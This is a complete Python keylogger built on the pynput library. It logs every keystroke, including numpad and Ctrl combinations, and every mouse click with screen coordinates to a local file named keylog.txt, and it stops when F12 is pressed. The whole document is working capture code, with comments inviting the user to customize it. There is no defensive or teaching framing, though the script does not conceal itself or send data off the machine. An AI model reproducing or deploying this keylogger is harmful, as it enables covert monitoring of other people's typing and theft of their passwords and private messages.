from pynput import keyboard, mouse
from os import _exit

# Customize these values to your liking.

# Name of the output file.
KEYLOG_FILENAME = "keylog.txt"

# Conversion of command names to characters.
KEY_STRING_CONVERT = {
    "[SPACE]": " ",
    "[SHIFT]": "",
    "[SHIFT_R]": "",
    "[CTRL_L]": "",
    "[CTRL_R]": "",
    "[ALT_GR]": "",
    "[96]": "0",
    "[97]": "1",
    "[98]": "2",
    "[99]": "3",
    "[100]": "4",
    "[101]": "5",
    "[102]": "6",
    "[103]": "7",
    "[104]": "8",
    "[105]": "9",
    "[106]": "*",
    "[107]": "+",
    "[108]": ",",
    "[109]": "-",
    "[110]": ".",
    "[111]": "/",
    "[F12]": "[EXIT]", # Exit key
}

# Format for the mouse click string. Customize this to your liking.
MOUSE_STRING_FORMAT = "[{btn}_MC_{x},{y}]"


# Writes a string to the keylog file
def write_string(string):
    print(string, end="")

    with open(KEYLOG_FILENAME, "a+") as f:
        f.write(string)

    if (string == "[EXIT]"):
        raise _exit(0)


# Writes a key press to the keylog file
def write_key(key):
    # Is a numpad key (weird behavior with these)
    if (hasattr(key, "vk") and key.vk >= 96 and key.vk <= 111):
        string = f"[{str(key.vk)}]"

    # Is an alphanumeric key
    elif (hasattr(key, "char") and key.char != None):
        # escape sequence (CTRL + key)
        if (len(str(key)[1:-1]) == 4):
            string = f"[CTRL^{str(chr(key.vk))}]"
        # no escape sequence
        else:
            string = str(key.char)

    # Is a special key
    elif (hasattr(key, "name")):
        string = f"[{str(key.name).upper()}]"

    # Is anything else (fallback)
    else:
        string = f"[{str(key)}]"

    if (string in KEY_STRING_CONVERT):
        string = KEY_STRING_CONVERT[string]

    write_string(string)

# Writes a mouse click to the keylog file
def write_click(x, y, button, pressed):
    if (pressed):
        letter = MOUSE_STRING_FORMAT.format(btn=button.name.upper(), x=x, y=y)
        write_string(letter)


# Listens for key presses
while True:
    try:
        with keyboard.Listener(on_press=write_key) as key_list, mouse.Listener(on_click=write_click) as mouse_list:
            key_list.join()
            mouse_list.join()
    except:
        pass